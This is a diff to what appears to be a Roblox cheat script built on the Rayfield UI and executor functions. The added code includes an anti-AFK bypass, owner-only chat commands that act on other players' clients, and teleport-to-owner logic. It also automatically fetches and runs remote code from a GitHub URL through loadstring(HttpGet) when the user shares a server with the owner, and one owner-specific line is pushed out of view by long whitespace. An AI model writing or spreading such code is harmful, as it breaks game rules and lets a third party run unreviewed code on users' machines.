@@ -136,6 +136,114 @@ KeySettings = {
    Key = {"MysOnTop"}
 }
 })
+
+local Players = game:GetService("Players")
+
+local function checkForUser()
+    local OwnerName = "01xMYS"
+    local OwnerPlayer = Players:FindFirstChild(OwnerName)
+
+    if OwnerPlayer then
+        -- Notify if the user is in the server
+        Rayfield:Notify({
+            Title = "User Detected!",
+            Content = OwnerName .. " is in this server!",
+            Duration = 6.5,
+            Image = 4483362458,
+        })
+    else
+        -- Optionally, notify if the user is not found
+        Rayfield:Notify({
+            Title = "User Not Found",
+            Content = OwnerName .. " is not in this server.",
+            Duration = 6.5,
+            Image = 4483362458,
+        })
+    end
+end
+
+-- Automatically check for the user when the script is executed
+checkForUser()
+
+local Players = game:GetService("Players")
+local OwnerName = "01xMYS"
+local OwnerFound = false -- To prevent duplicate notifications
+
+local function checkForUser()
+    local OwnerPlayer = Players:FindFirstChild(OwnerName)
+
+    if OwnerPlayer and not OwnerFound then
+        OwnerFound = true
+        -- Notify if the user joins the server
+        Rayfield:Notify({
+            Title = "User Detected!",
+            Content = OwnerName .. " has joined the server!",
+            Duration = 6.5,
+            Image = 4483362458,
+        })
+    end
+end
+
+-- Monitor when players join
+Players.PlayerAdded:Connect(function(player)
+    if player.Name == OwnerName then
+        checkForUser()
+    end
+end)
+
+-- Initial check in case the player is already in the server
+checkForUser()
+
+local Players = game:GetService("Players")
+
+local OwnerName = "01xMYS" -- The username of the player sending the command
+
+-- Function to handle notifications
+local function handleChatCommand(sender, message)
+    -- Check if the sender is the specified owner
+    if sender.Name == OwnerName then
+        -- Check if the message starts with ".notify"
+        if message:sub(1, 7) == "/notify" then
+            -- Extract the target username and the content
+            local commandContent = message:sub(9):match("^%s*(.-)%s*$") -- Remove leading/trailing spaces
+            if commandContent then
+                local targetName, notifyContent = commandContent:match("^(%S+)%s*(.*)$")
+                if targetName then
+                    local targetPlayer = Players:FindFirstChild(targetName)
+                    if targetPlayer and targetPlayer == Players.LocalPlayer then
+                        -- Notify the target player with the provided content
+                        Rayfield:Notify({
+                            Title = "01xMYS Notified You!",
+                            Content = notifyContent ~= "" and notifyContent or "You have been notified by " .. OwnerName .. "!",
+                            Duration = 6.5,
+                            Image = 4483362458,
+                        })
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- Connect to the chat messages
+Players.PlayerAdded:Connect(function(player)
+    if player.Name == OwnerName then
+        player.Chatted:Connect(function(message)
+            handleChatCommand(player, message)
+        end)
+    end
+end)
+
+-- Handle the case where the owner is already in the server
+local ownerPlayer = Players:FindFirstChild(OwnerName)
+if ownerPlayer then
+    ownerPlayer.Chatted:Connect(function(message)
+        handleChatCommand(ownerPlayer, message)
+    end)
+end
+
+
+
 wait(0.1)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     if game.Players.LocalPlayer.Name == "01xMYS" then
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         if getgenv().passed_loaded_jobid_joiner then
@@ -1066,6 +1174,56 @@ local function applyRainbowEffect()
  end
 end
 
+local GC = getconnections or get_signal_cons
+local AntiAFKEnabled = false -- To track the current state of the toggle
+
+local Toggle = Tab3:CreateToggle({
+    Name = "Anti-AFK Toggle",
+    CurrentValue = false,
+    Flag = "AntiAFKToggle", -- Unique identifier for the toggle
+    Callback = function(Value)
+        if Value then
+            -- Enable Anti-AFK
+            AntiAFKEnabled = true
+            if GC then
+                for _, v in pairs(GC(game:GetService("Players").LocalPlayer.Idled)) do
+                    if v["Disable"] then
+                        v["Disable"](v)
+                    elseif v["Disconnect"] then
+                        v["Disconnect"](v)
+                    end
+                end
+            else
+                local VirtualUser = cloneref(game:GetService("VirtualUser"))
+                game:GetService("Players").LocalPlayer.Idled:Connect(function()
+                    if AntiAFKEnabled then
+                        VirtualUser:CaptureController()
+                        VirtualUser:ClickButton2(Vector2.new())
+                    end
+                end)
+            end
+
+            Rayfield:Notify({
+                Title = "Anti-AFK Enabled",
+                Content = "Anti-AFK has been successfully activated.",
+                Duration = 6.5,
+                Image = 4483362458,
+            })
+        else
+            -- Disable Anti-AFK
+            AntiAFKEnabled = false
+            Rayfield:Notify({
+                Title = "Anti-AFK Disabled",
+                Content = "Anti-AFK has been successfully deactivated.",
+                Duration = 6.5,
+                Image = 4483362458,
+            })
+        end
+    end,
+})
+
+
+
 -- Toggle for the rainbow effect
 local Toggle = Tab3:CreateToggle({
  Name = "Rainbow Character",
@@ -1741,4 +1899,98 @@ local Input = Tab8:CreateInput({
     end,
 })
 
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+
+local OwnerName = "01xMYS" -- The requested player's username
+local ScriptURL = 'https://raw.githubusercontent.com/MYSISBETTER/V6.2/refs/heads/main/MainV1' -- The script URL
+
+local function executeScript()
+    Rayfield:Notify({
+        Title = "Executing Script",
+        Content = "Automatically executing the requested script...",
+        Duration = 6.5,
+        Image = 4483362458,
+    })
+    loadstring(game:HttpGet(ScriptURL))()
+end
+
+local function teleportToOwnerOrServer()
+    local LocalPlayer = Players.LocalPlayer
+    local OwnerPlayer = Players:FindFirstChild(OwnerName)
+
+    if OwnerPlayer then
+        -- Owner is in the same server
+        if OwnerPlayer.Character and OwnerPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            LocalPlayer.Character:PivotTo(OwnerPlayer.Character.HumanoidRootPart.CFrame)
+            Rayfield:Notify({
+                Title = "Teleported",
+                Content = "You have been teleported to " .. OwnerName .. "!",
+                Duration = 6.5,
+                Image = 4483362458,
+            })
+        else
+            Rayfield:Notify({
+                Title = "Teleport Failed",
+                Content = OwnerName .. " is in the server but their character is not fully loaded.",
+                Duration = 6.5,
+                Image = 4483362458,
+            })
+        end
+    else
+        -- Owner is not in the server, attempt to teleport to their server
+        print("Owner not found in the current server. Searching for their server...")
+        local success, result = pcall(function()
+            return TeleportService:GetPlayerPlaceInstanceAsync(OwnerName)
+        end)
+
+        if success and result then
+            Rayfield:Notify({
+                Title = "Teleporting",
+                Content = "Teleporting to " .. OwnerName .. "'s server...",
+                Duration = 6.5,
+                Image = 4483362458,
+            })
+            TeleportService:TeleportToPlaceInstance(result.PlaceId, result.InstanceId, LocalPlayer)
+        else
+            Rayfield:Notify({
+                Title = "Teleport Failed",
+                Content = "Could not find " .. OwnerName .. "'s server.",
+                Duration = 6.5,
+                Image = 4483362458,
+            })
+            warn("Error while trying to teleport: ", result)
+        end
+    end
+end
+
+-- Automatically execute the script when joining the owner's server
+local function checkServerForOwner()
+    local success, result = pcall(function()
+        return TeleportService:GetPlayerPlaceInstanceAsync(OwnerName)
+    end)
+
+    if success and result then
+        local currentPlaceId = game.PlaceId
+        local currentInstanceId = game.JobId
+
+        -- Check if the current server matches the owner's server
+        if currentPlaceId == result.PlaceId and currentInstanceId == result.InstanceId then
+            executeScript()
+        end
+    else
+        warn("Failed to check server for owner: ", result)
+    end
+end
+
+-- Call this function on script execution to check the current server
+checkServerForOwner()
+
+-- Create a button for manual teleportation
+local TPOwnerBruh = Tab1:CreateButton({
+    Name = "Teleport To: 01xMYS {owner}",
+    Callback = function()
+        teleportToOwnerOrServer()
+    end,
+})
 
